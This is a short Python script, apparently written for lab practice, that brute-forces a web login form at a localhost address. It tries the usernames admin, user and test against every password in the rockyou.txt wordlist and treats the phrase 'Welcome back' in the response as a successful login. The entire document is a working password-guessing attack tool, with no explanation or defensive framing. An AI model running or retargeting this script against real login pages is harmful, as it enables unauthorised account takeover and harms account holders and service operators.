import requests
import sys

target = "http://127.0.0.1:5000"
usernames = ["admin","user","test"]
passwords = "rockyou.txt"
needle = "Welcome back"

for username in usernames:
    with open(passwords, "r") as passwords_lists:
        for password in passwords_lists:
             password = password.strip("\n").encode()
             sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username,password.decode()))
             sys.stdout.flush()
             r = requests.post(target, data={"username": username, "password": password})
             if needle.encode() in r.content:
                 sys.stdout.write("\n")
                 sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'".format(password.decode(),username))
                 sys.exit()
        sys.stdout.flush()
        sys.stdout.write("\n\tNo password found for '{}' ".format(username))